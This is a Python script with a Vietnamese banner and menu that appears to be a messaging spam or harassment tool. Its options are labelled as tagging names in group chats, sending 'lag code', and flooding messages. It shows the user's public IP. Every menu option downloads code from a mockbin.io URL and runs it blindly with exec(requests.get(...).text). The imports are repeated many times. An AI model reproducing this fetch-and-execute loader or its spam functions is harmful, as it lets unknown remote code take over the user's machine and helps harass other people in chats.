from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import uuid, re
from bs4 import BeautifulSoup
import socket
from datetime import datetime
time=datetime.now().strftime("%H:%M:%S")
from pystyle import *
data_machine = []
today = date.today()
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
#IP
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'

import os, sys, requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now=datetime.now()
os.system("cls" if os.name == "nt" else "clear")

import os, sys, requests
from time import sleep
from pystyle import *
from time import strftime
from datetime import datetime, timedelta
now=datetime.now()
os.system("cls" if os.name == "nt" else "clear")
sleep(1)
banner="""
\033[1;32m╔══════════════════════════════════════════════╗
\033[1;32m║   \033[1;31mLoại Tool : \033[1;33m37k
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mLiên Hệ Facebook : \033[1;33mfb.com/100087467532437
\033[1;32m║══════════════════════════════════════════════║
\033[1;32m║   \033[1;31mLiên Hệ Tik Tok : \033[1;33mthaykietdz2x
\033[1;32m╚══════════════════════════════════════════════╝
\033[1;31m
\033[1;31m  ████████╗██╗  ██╗ █████╗ ██╗   ██╗    ██╗  ██╗██╗███████╗████████╗
  \033[1;34m╚══██╔══╝██║  ██║██╔══██╗╚██╗ ██╔╝    ██║ ██╔╝██║██╔════╝╚══██╔══╝
  \033[1;33m   ██║   ███████║███████║ ╚████╔╝     █████╔╝ ██║█████╗     ██║   
  \033[1;32m   ██║   ██╔══██║██╔══██║  ╚██╔╝      ██╔═██╗ ██║██╔══╝     ██║   
  \033[1;35m   ██║   ██║  ██║██║  ██║   ██║       ██║  ██╗██║███████╗   ██║   
  \033[1;36m╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝

"""
for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.00)
print(f"{xduong}█ {hong}Ngày{trang} : {vang}{ngay_hom_nay}{xduong} |{hong} Tháng{trang}: {vang}{thang_nay} {xduong}| {hong}Năm{trang}: {vang}{nam_}{xduong} | {hong}Thời Gian: {vang}{time}")
print(f'{xduong}█ {hong}Địa Chỉ IP Của Bạn : {vang}{ip}')

print("\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")

print(" \033[1;37m╔═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức Năng [1] \033[1;36mNhây Có Dấu")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")   
print("\033[1;32m ║ ➢Chức năng [2] \033[1;36mNhây Không Dấu")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")                                                          
print("\033[1;32m ║ ➣Chức năng [3] \033[1;36mNhây Réo Tên Trong Box ")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")
print("\033[1;32m ║ ➣Chức năng [4] \033[1;36mNhây Code Lag")                               
print(" \033[1;37m║═════════════════════════════════════════════════════════════")                                                          
print("\033[1;32m ║ ➢Chức năng [5] \033[1;36mTreo Sớ")
print(" \033[1;37m║═════════════════════════════════════════════════════════════")   
print("\033[1;32m ║ ➣Chức năng [6] \033[1;36mNhây Dis")
print(" \033[1;37m╚═════════════════════════════════════════════════════════════")
chon = int(input('\033[1;31m[\033[1;37m[=.=]\033[1;31m] \033[1;37m=> \033[1;32mChọn chức năng \033[1;37m: \033[1;35m'))

if chon == 1 :

	exec(requests.get('https://a738582eb4ed4df38112753cd8da5a56.api.mockbin.io/').text)

if chon == 2 :

	exec(requests.get('https://9ba25774f3e94d5d86e82b39b3f5c114.api.mockbin.io/').text)
if chon == 3 :

	exec(requests.get('https://20cbf6d727d64411933e0e021a8492b5.api.mockbin.io/').text)

if chon == 4 :

	exec(requests.get('https://0c57679f6e9c4cab9470884a5023313f.api.mockbin.io/').text)

if chon == 5 :

	exec(requests.get('https://345e8b3388d14fbf8e36f82e3cbf41b2.api.mockbin.io/').text)

if chon == 6 :
	
	exec(requests.get('https://41193416e7d344548ded29a41165fbb2.api.mockbin.io/').text)

	exit()